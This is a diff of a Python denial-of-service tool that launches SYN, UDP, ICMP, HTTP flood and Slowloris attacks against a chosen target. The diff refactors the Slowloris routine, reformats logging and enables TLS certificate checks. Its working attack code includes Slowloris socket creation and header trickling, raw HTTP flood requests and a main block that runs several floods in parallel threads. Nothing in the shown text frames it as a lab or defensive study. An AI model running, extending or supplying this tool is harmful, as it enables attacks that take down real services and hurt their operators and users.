@@ -1,11 +1,11 @@
 import argparse
 import logging
 import socket
+import ssl
 import time
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from urllib.parse import urlparse
 
-import ssl
 from colorama import init
 from rich.logging import RichHandler
 from scapy.all import ICMP, IP, TCP, UDP, send
@@ -80,7 +80,8 @@ def slowloris_attack(target_host, target_port, num_sockets=50):
     log.info(
         f"Starting Slowloris attack on {target_host}:{target_port} (sockets={num_sockets})"
     )
-    
+    sockets = []
+
     def create_socket(i):
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -92,48 +93,68 @@ def slowloris_attack(target_host, target_port, num_sockets=50):
             log.info(f"SLOWLORIS - SOCKET {i+1}/{num_sockets} opened")
             return True
         except socket.timeout:
-            log.warning(f"SLOWLORIS - Socket operation timed out for socket {i+1}. Skipping.")
+            log.warning(
+                f"SLOWLORIS - Socket operation timed out for socket {i+1}. Skipping."
+            )
         except socket.error as e:
-            log.error(f"SLOWLORIS - Socket error {e} when opening socket {i+1}. Skipping.")
+            log.error(
+                f"SLOWLORIS - Socket error {e} when opening socket {i+1}. Skipping."
+            )
         return False
-    
+
     def send_headers(s, idx):
         try:
             s.send(b"X-a: b\r\n")
             log.info(f"SLOWLORIS - HEADER {pkt_count} sent")
             return True
-        except socket.timeout:
-            log.warning(f"SLOWLORIS - Socket operation timed out for socket {idx+1}. Removed.")
-        except socket.error as e:
-            log.error(f"SLOWLORIS - Socket error {e} for socket {idx+1}. Removed.")
+        except (socket.timeout, socket.error) as e:
+            log.warning(
+                f"SLOWLORIS - Socket error {type(e).__name__} for socket {idx+1}. Removed."
+            )
         except Exception as e:
-            log.critical(f"SLOWLORIS - Unexpected error {type(e).__name__} - {e} for socket {idx+1}. Removed.")
+            log.critical(
+                f"SLOWLORIS - Unexpected error {type(e).__name__} - {e} for socket {idx+1}. Removed."
+            )
         return False
-    
-    sockets = []
-    for i in range(num_sockets):
-        create_socket(i)
 
-    try:
-        pkt_count = 0
+    def initialize_sockets():
+        for i in range(num_sockets):
+            create_socket(i)
+
+    def maintain_attack():
+        nonlocal pkt_count
         while sockets:
-            for idx, s in enumerate(sockets[:]):
-                pkt_count += 1
-                if not send_headers(s, idx):
-                    sockets.remove(s)
-                    s.close()
+            process_sockets()
             if not sockets:
                 log.warning("SLOWLORIS - No sockets left, stopping attack.")
                 break
             time.sleep(10)
+
+    def process_sockets():
+        nonlocal pkt_count
+        for s in list(sockets):  # Use list() to avoid modification during iteration
+            pkt_count += 1
+            if not send_headers(s, sockets.index(s)):
+                sockets.remove(s)
+                s.close()
+
+    initialize_sockets()
+    pkt_count = 0
+
+    try:
+        maintain_attack()
     except KeyboardInterrupt:
         log.info(f"Slowloris attack stopped on {target_host}:{target_port}")
     finally:
-        for s in sockets:
-            try:
-                s.close()
-            except Exception:
-                pass
+        cleanup_sockets(sockets)
+
+
+def cleanup_sockets(sockets):
+    for s in sockets:
+        try:
+            s.close()
+        except Exception:
+            pass
 
 
 def send_request(i, target_url, _):
@@ -144,7 +165,7 @@ def send_request(i, target_url, _):
         path = p.path or "/"
         if p.query:
             path += "?" + p.query
-            
+
         req = (
             f"GET {path} HTTP/1.1\r\n"
             f"Host: {host}\r\n"
@@ -154,8 +175,8 @@ def send_request(i, target_url, _):
 
         if p.scheme == "https":
             ctx = ssl.create_default_context()
-            ctx.check_hostname = False
-            ctx.verify_mode = ssl.CERT_NONE
+            ctx.check_hostname = True
+            ctx.verify_mode = ssl.CERT_REQUIRED
             with socket.create_connection((host, port), timeout=1) as sock:
                 with ctx.wrap_socket(sock, server_hostname=host) as ssock:
                     ssock.sendall(req)
@@ -164,10 +185,11 @@ def send_request(i, target_url, _):
             with socket.create_connection((host, port), timeout=1) as sock:
                 sock.sendall(req)
                 return sock.recv(1024)
-                
+
     except Exception as e:
         log.error(f"HTTP FLOOD - Request failed: {e}")
         return None
+
 
 def run_http_flood(target_url, packages, threads):
     log.info(
@@ -273,7 +295,9 @@ if __name__ == "__main__":
     if args.syn:
         attack_tasks.append((run_syn_flood, (host, port, args.packages, args.threads)))
     if args.https:
-        attack_tasks.append((run_http_flood, (args.target, args.packages, args.threads)))
+        attack_tasks.append(
+            (run_http_flood, (args.target, args.packages, args.threads))
+        )
     if args.udp:
         attack_tasks.append((run_udp_flood, (host, port, args.packages, args.threads)))
     if args.icmp:
@@ -282,8 +306,10 @@ if __name__ == "__main__":
         attack_tasks.append((run_slowloris, (host, port, args.packages, args.threads)))
 
     if len(attack_tasks) == 0:
-        attack_tasks.append((run_http_flood, (args.target, args.packages, args.threads)))
-        
+        attack_tasks.append(
+            (run_http_flood, (args.target, args.packages, args.threads))
+        )
+
     log.info("Starting all attack tasks using ThreadPoolExecutor...")
     with ThreadPoolExecutor(max_workers=len(attack_tasks)) as executor:
         futures = []
